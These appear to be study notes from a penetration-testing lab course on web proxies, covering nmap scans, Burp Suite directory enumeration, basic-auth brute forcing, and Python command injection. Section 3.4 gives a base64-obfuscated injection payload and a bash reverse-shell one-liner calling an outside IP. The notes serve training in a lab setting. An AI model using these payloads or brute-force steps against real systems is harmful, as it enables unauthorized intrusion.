## 3. Web proxies

### 3.1. Passive crawling with Burp Suite

- **Actions**:
  - Check accessibility → ```ping -c 4 demo.ine.local```
  - Nmap on specific port → ```nmap -sV -p 80 demo.ine.local```
  - Nmap probe open ports and TCP scan → ```nmap -sV -sS demo.ine.local```

### 3.2. Directory enumeration with Burp Suite

- **Actions**:
  - 1. Check open ports and services with nmap → ```nmap -sV -sS 192.27.104.3```
  - 2. Access application, open burp suite, intercept main get request. Send to intruder
  - 3. Set sniper attack and the wordlist

### 3.3. Attacking basic auth with burp suite

- **Actions**:
  - 1. Perform directory bruteforce with gobuster → ``gobuster dir --url http://192.229.235.3 --wordlist /usr/share/wordlists/dirb/common.txt``
  - 2. Look for 401 codes and access that url.
  - 3. Send the request and intercept it → basic authorization with base 64. Set creds variable in there
  - 4. Add wordlist
  - 5. Set prefix with username and encoding to base 64
  - 6. When launching the attack, don't filter everything but 200, as the result may be a 3xx
  - 7. Take the result and decode it

### 3.4. Python command line injection

- **Actions**:
  - 1. Payload to execute remote shell → ``{"expr":"__import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjQxLjIxLjIvNDAwMCAwPiYx | base64 -d | bash')"}``
    - Encoded base64 content → ``bash -i >& /dev/tcp/192.241.21.2/4000 0>&1``
  - 2. Reverse shell notes
    - ``bash -i >& /dev/tcp/192.241.21.2/4000 0>&1``
      - i switch → interactive
      - >& → redirects stdin and stdout to specific destination
      - 0>&1 → 0 (stdin) and 1 (stdout). Takes the input and sends it to the output
  - 3. Find files → ``find / -name flag 2>/dev/null``